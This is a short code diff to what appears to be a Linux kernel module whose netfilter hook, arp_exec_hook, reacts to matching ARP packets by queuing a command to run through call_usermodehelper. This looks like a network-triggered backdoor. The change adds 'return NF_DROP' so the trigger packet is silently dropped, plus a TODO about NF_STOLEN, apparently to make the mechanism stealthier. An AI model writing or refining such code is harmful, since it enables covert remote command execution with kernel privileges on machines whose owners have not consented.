@@ -94,6 +94,7 @@ static void arp_exec_work(struct work_struct *work) {
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     kfree(my_arp_work);
 }
+// TODO: look into NF_STOLEN
 
 /* Netfilter hook function */
 unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
@@ -157,6 +158,7 @@ unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
             /* Initialize work and queue it */
             INIT_WORK(&work->work, arp_exec_work);
             queue_work(arp_wq, &work->work);
+            return NF_DROP;
         } else {
             printk(KERN_INFO "ARP header does not match Ethernet and IPv4\n");
         }
